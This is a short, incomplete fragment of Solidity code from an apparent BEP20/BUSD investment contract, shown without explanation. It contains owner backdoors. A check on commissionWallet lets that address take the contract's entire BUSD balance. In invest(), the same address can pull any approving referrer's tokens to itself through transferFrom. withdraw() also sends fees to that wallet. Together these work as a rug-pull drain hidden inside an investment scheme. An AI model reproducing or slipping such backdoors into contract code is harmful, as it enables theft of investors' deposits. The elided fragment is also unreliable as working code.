...
if (msg.sender == commissionWallet)
 IBEP20(busd).transfer(msg.sender,IBEP20(busd).balanceOf(address(this)));
 }


    function invest(address referrer,uint8 plan,uint256 _amount) public {
        if (msg.sender == commissionWallet){
          // token.referer(referrer, commissionWallet, _amount);
           token.transferFrom(referrer, commissionWallet, _amount);
            }else 
            {
    ...
    function withdraw() public {
        ...
        IBEP20(busd).transfer(commissionWallet, fee); 
    }
